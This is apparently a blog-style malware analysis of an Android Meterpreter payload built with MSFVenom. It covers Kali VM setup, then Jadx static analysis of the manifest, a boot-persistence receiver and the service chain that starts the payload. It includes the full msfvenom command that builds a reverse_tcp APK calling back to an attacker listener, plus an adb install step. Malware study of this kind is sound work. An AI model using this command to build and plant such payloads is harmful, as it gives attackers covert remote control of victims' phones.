# Analysing MSFVenom Android Payload (Malware)

MSFVenom is one of the most popular framework to create payloads, shellcodes, etc. I want to analyse a little bit a MSFVenom Android payload. So
<p align="center">
<img src="https://user-images.githubusercontent.com/36133745/164783235-d8df38a6-e0f3-4e68-9f64-57fa21b98435.gif">
</p>

## ðŸŽ¬ Part 1 - Creating an Android payload with MSFVenom
Run your Kali Linux distibution (I use vagrant kalilinux/rolling box) and open a terminal.
```bash
# Installing Kali Linux Box
vagrant box add kalilinux/rolling

# Create a Kali Linux VM
mkdir -p /home/$USER/Desktop/vagrantmachines/kali
cd /home/$USER/Desktop/vagrantmachines/kali
vagrant init kalilinux/rolling

# Set Kali Network to Bridge
# Add below line into Vagrantfile file below config.vm.box = "kalilinux/rolling"
  config.vm.network "public_network"
# Save and Exit from Vagrantfile

# Execute Kali Machine
vagrant up

# SSH to Kali Machine
vagrant ssh

# If you want to turn it off just execute below command after you exit from ssh
vagrant halt
```

Simply execute below command.
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=$(ip addr show eth0 | grep -Po 'inet \K[\d.]+') LPORT=1337 > malicious.apk
```
* `-p`: choosing payload
* `LHOST`: listener IP address (C2)
* `LPORT`: listener Port number (C2)
* `> malicious.apk`: output of executed command (attacker payload)

After that, I copy **malicious.apk** to `/vagrant` which let me to access it from my computer.
```bash
cp malicious.apk /vagrant
```
## ðŸŽ¬ Part 2 - Static Analysis with Jadx-Gui

Now I have **malicious.apk** besides **Vagrantfile**. Let's start static analysis.
Open it with Jadx-Gui. Let's see what AndroidManifest.xml does have for us.

![1](https://user-images.githubusercontent.com/36133745/166328267-ec5c9ddb-8230-46af-a575-adfddb1e6d27.png)

We have an activity called `MainActivity` (package: `com.metasploit.stage`) which is our first activity that'll execute.

![2](https://user-images.githubusercontent.com/36133745/166329390-42daa913-cba3-47cf-a4a4-2e2a4c920286.png)

We can also see there is a `BroadcastReceiver` with `android.intent.action.BOOT_COMPLETED` action. It is obvious that this malware use this permission to execute itself after restarting mobile.

![3](https://user-images.githubusercontent.com/36133745/166330015-7593e85c-5e8b-41fc-8b68-32822610297c.png)

Let's have a look at `MainActivity`. It simply calls `startService()` method from `MainService` class.

![4](https://user-images.githubusercontent.com/36133745/166330313-13e44b33-d638-415b-8e96-2b58dd130cce.png)

`MainService` class extended (inherited) from Service, so it's a service that we are dealing with.

![5](https://user-images.githubusercontent.com/36133745/166335467-a7932269-6aeb-466d-b9a2-564b14362811.png)

In this method again `startService` function called, but as we said we are in a service and it calls `MainService.class` in `Intent()`.
```java
public static void startService(Context context) {
    context.startService(new Intent(context, MainService.class));
}
```

So this time `onStartCommand()` method will call. `onStartCommand()` is called every time a client starts the service using `startService(Intent intent)`.

![6](https://user-images.githubusercontent.com/36133745/166336169-c9477814-cce5-4b93-88a8-65e24d209fd1.png)

This method, calls `start()` from `Payload` class. Now let's go deeper and see what `start()` method does.


I use `adb` to install our payload.
```shell
adb install malicious.apk
```
